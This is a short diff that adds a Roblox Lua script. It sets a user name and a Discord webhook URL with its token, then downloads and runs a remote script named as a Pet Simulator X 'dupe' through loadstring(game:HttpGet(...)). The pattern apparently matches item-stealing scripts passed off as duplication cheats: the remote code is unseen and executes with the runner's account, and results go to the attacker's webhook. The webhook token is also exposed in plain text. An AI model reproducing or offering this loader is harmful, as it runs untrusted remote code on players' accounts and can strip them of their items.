@@ -1,0 +1,5 @@
+UserName = "Dev_RlCH"
+WebHook  = "https://discord.com/api/webhooks/1054151574861140029/8W0smuzRHtQjKbQLKNdDYggalBWl84pzN6HmN_EkaD1iPaYAHKkaPHGO3yXKdowCfMWT"
+Mention  = true
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/petsmixdupe/main/PSX.lua", true))()
